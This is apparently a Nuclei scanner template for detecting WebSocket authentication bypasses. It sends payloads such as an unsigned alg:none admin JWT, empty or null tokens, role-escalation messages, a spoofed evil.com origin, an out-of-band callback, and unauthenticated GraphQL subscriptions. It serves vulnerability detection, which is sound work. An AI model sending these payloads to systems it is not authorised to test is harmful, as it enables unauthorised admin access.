id: websocket-auth-bypass-real
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 9.3
    cwe-id: CWE-287,CWE-346
  description: 'Detects ACTUAL WebSocket authentication bypasses by establishing real
    WebSocket

    connections and testing various authentication bypass techniques including

    missing origin validation, token manipulation, and protocol downgrade.

    '
  name: WebSocket Authentication Bypass with Real Connection Testing
  reference:
  - https://portswigger.net/web-security/websockets
  - https://tools.ietf.org/html/rfc6455
  severity: critical
  tags: websocket,auth-bypass,critical,real
variables:
  bypass_id: '{{randstr}}'
  callback: '{{interactsh-url}}'
websocket:
- address: ws://{{Hostname}}/ws
  inputs:
  - data: '{"type":"connect","user":"admin"}'
  - data: '{"type":"auth","token":""}'
  - data: '{"type":"auth","token":null}'
  - data: '{"type":"login","user":"guest","role":"admin"}'
  - data: '{"type":"auth","jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}'
  - data: '{"type":"validate","callback":"{{callback}}/ws-{{bypass_id}}"}'
  matchers:
  - part: response
    type: word
    words:
    - '"authenticated":true'
    - '"role":"admin"'
    - '"success":true'
    - Welcome admin
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  matchers-condition: or
- address: wss://{{Hostname}}/ws
  inputs:
  - data: '{"type":"connect","origin":"evil.com"}'
  matchers:
  - negative: false
    part: response
    type: word
    words:
    - connected
    - authenticated
  origin: https://evil.com
- address: ws://{{Hostname}}/socket.io/?transport=websocket
  inputs:
  - data: 42["authenticate",{"token":"bypass","admin":true}]
  - data: 42["join",{"room":"admin","bypass":true}]
  matchers:
  - part: response
    regex:
    - 43\["authenticated"
    - '"sid":"[a-zA-Z0-9]+"'
    type: regex
- address: ws://{{Hostname}}/graphql-ws
  inputs:
  - data: '{"type":"connection_init","payload":{"authorization":""}}'
  - data: '{"type":"start","payload":{"query":"subscription { adminData }"}}'
  matchers:
  - part: response
    type: word
    words:
    - connection_ack
    - '"data":'
